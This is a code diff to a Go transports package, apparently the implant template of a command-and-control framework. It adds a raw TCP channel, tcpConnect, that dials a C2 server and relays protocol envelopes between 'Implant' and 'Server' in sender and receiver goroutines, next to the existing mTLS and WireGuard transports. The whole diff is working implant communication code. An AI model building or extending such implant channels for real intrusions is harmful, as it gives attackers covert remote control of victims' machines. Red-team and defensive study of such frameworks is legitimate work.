@@ -19,7 +19,7 @@ package transports
 */
 
 import (
-	// {{if or .Config.IncludeWG .Config.IncludeHTTP}}
+	// {{if or .Config.IncludeWG .Config.IncludeHTTP .Config.IncludeTCP}}
 	"net"
 
 	// {{end}}
@@ -154,7 +154,19 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 					// {{end}}
 					continue
 				}
-				// {{end}}  - IncludeMTLS
+				// {{end}} - IncludeMTLS 
+
+			case "tcp":
+				// {{if .Config.IncludeTCP }}
+				 connection, err = tcpConnect(uri)
+				 if err != nil{
+					 //{{if .Config.Debug}}
+					 log.Printf("[tcp] connection failed %s ",err)
+					 //{{end}}
+					 continue
+        }
+				//{{end}} - IncludeTCP
+				
 			case "wg":
 				// *** WG ***
 				// {{if .Config.IncludeWG}}
@@ -445,6 +457,103 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 }
 
 // {{end}} -IncludeMTLS
+//{{if .Config.IncludeTCP}}
+
+// tcpConnect - Establish a simple raw TCP connection
+func tcpConnect(uri *url.URL) (*Connection, error) {
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan struct{})
+	done := make(chan struct{})
+
+	connection := &Connection{
+		Send:   send,
+		Recv:   recv,
+		ctrl:   ctrl,
+		tunnels: map[uint64]*Tunnel{},
+		mutex:  &sync.RWMutex{},
+		IsOpen: false,
+		uri:    uri,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[tcp] cleanup...")
+			// {{end}}
+			close(done)
+		},
+	}
+
+	connection.Stop = func() error {
+		connection.Cleanup()
+		return nil
+	}
+
+	connection.Start = func() error {
+		// {{if .Config.Debug}}
+		log.Printf("[tcp] Connecting -> %s", uri.Host)
+		// {{end}}
+
+		conn, err := net.DialTimeout("tcp", uri.Host, 30*time.Second)
+		if err != nil {
+			return err
+		}
+
+		connection.IsOpen = true
+
+		//
+		// Sender goroutine (Implant → Server)
+		//
+		go func() {
+			defer connection.Cleanup()
+			defer conn.Close()
+
+			for {
+				select {
+				case <-done:
+					return
+				case envelope, ok := <-send:
+					if !ok {
+						return
+					}
+					if err := tcpWriteEnvelope(conn, envelope); err != nil {
+						// {{if .Config.Debug}}
+						log.Printf("[tcp] write error: %v", err)
+						// {{end}}
+						return
+					}
+				}
+			}
+		}()
+
+		//
+		// Receiver goroutine (Server → Implant)
+		//
+		go func() {
+			defer connection.Cleanup()
+			defer conn.Close()
+
+			for {
+				envelope, err := tcpReadEnvelope(conn)
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[tcp] read error: %v", err)
+					// {{end}}
+					return
+				}
+				select {
+				case recv <- envelope:
+				case <-done:
+					return
+				}
+			}
+		}()
+
+		return nil
+	}
+
+	return connection, nil
+}
+//{{end}} - IncludeTCP
+
 
 // {{if .Config.IncludeWG}}
 func wgConnect(uri *url.URL) (*Connection, error) {
